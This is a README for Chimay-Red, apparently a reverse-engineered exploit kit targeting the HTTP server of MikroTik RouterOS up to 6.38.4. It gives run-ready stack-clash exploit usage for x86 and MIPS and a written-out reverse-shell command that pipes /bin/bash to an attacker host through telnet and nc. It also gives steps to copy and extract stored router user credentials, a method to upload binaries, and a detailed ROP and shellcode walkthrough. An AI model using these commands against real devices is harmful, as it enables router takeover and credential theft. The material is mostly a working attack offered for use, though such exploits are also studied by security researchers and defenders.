Chimay-Red
==========

Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks

See the [PDF](docs/ChimayRed.pdf) for more info

# Vulnerable versions
Until RouterOS 6.38.4

What's new in 6.38.5 (2017-Mar-09 11:32):
!) www - fixed http server vulnerability;


# Proof of concepts
## CrashPOC
Simple crash sending -1 as content-length in post header


## StackClashPOC
Stack clash exploit using two threads, missing ROP chain


## Set up Python 2.7 virtual environment for exploit

Create Python 2.7 virtual environment within cloned git repository:

    virtualenv -p `which python2.7` venv


and activate it:

    source venv/bin/activate


Install required by exploit Python libraries within just created virtual environment:

    pip install -r requirements.txt


Install Capstone library which is required by Python **ropper** package:

    # Debian or Ubuntu
    sudo apt-get install libcapstone3


# Working exploits
## StackClash_x86
Stack clash exploit uses two threads with ROP chain to run bash commands

As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.
It's placed in `/nova/bin/`
Check that the running version is the same.
To simplify extraction you can use:

    ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_6384_x86_binary


### For a reverse shell:

Start NetCat to listen on port 1234 for the connect back shell:

    nc -l -p 1234


Run exploit in another shell window:

    ./StackClash_x86.py 192.168.8.1 80 www_6384_x86_binary \
    "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"


Where:
- RouterOS IP: 192.168.8.1
- PC IP: 192.168.8.5


### To extract users and passwords
```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
$ sleep 3 # (wait some seconds that www is restarted)
$ wget http://192.168.8.1/winbox/index
$ ./tools/extract_user.py index
```

## StackClash_mips
Stack clash exploit using two threads with ROP chain + shell code to run bash commands
On mips version of www the stack is RWX, so we can jump to the stack.

You can run the same bash command as the x86 version.
The exploit is dynamically created, so it should work on any version minor than 6.38.4.

### LCD
Funny command
```
$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"
```
![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)

### Upload binaries
On PC run:
```
$ hexdump -v -e '"echo -e -n " 1024/1 "\\\\x%02X" " >> /ram/busybox\n"' busybox-mips | sed -e "s/\\\\\\\\x  //g" | nc -l -q 0 -p 1234
```
In another shell run reverse shell command.
Once the file is uploaded, run again reverse shell (this time only with `nc -l -p 1234`) and you will find busybox inside `/ram/`.

# FAQ
#### Where does one get the chimay-red.py file, that this tool kit relies on?
This is a reverse engineering of leaked CIA documentation.
There is no chimay-red.py publicly available.

#### I can't understand how the stack clash work.
I'll update the PDF as soon as I have enough time, anyway:
We know that:
- each thread has 128KB of stack
- each stack of each thread is stacked on the top of the previous thread.

Thanks to Content-Length and alloca macro we can control the Stack Pointer and where the post data will be written.
If we send a Content-Length bigger than 128KB to socket of thread A, the Stack Pointer will point inside the stack of another thread (B) and so the POST data (of thread A) will be written inside the stack of thread B (in any position we want, we only need to adjust the Content-Length value).
So now we can write a ROP chain in the stack of thread B starting from a position where a return address is saved.
When we close the socket of thread B, the ROP chain will start because the function that is waiting for data will return (but on our modified address).

##### x86

The ROP chain construct "system" string and "your_shell_cmd" string looking for chunks of strings inside the binary and concatenating them in an unused area of memory.
Then we return to "dlsym" function (present in the PLT) passing as argument the address of just created string "system" to find the address of "system" function.
Now we can return to the address of system passing as argument the address of the just created string "your_shell_cmd".

##### mips
DEP is disabled on this version of www, so I can execute the stack.
But I cannot use system function because "/bin/sh" is not present on the file system, so I used execve directly.
A small ROP (3 gadgets) find the address of a location on the stack (where I put the shell code), and then jump to that address.
In the shell code I populate an array of 4 pointers with the address of the strings "/bin/bash", "-c", "your_shell_cmd" using the leaked address of the stack (the last pointer is left NULL).
Then I populate a0, a1, a2 with rispectively: address of "/bin/bash", address of the array populated at the preceeding step and the address of the NULL entry of the array.
At this point I can launch the syscall 4011 (execve) to execute my bash command.

# Comments
- On very old versions like 6.18, the stack size is not 128KB, so the exploit doesn't work, i'll fix it in the future
- If the exploit doesn't work on recent version, make it crash with CrashPOC 3 or 4 times, then launch immediately StackClash and it will work
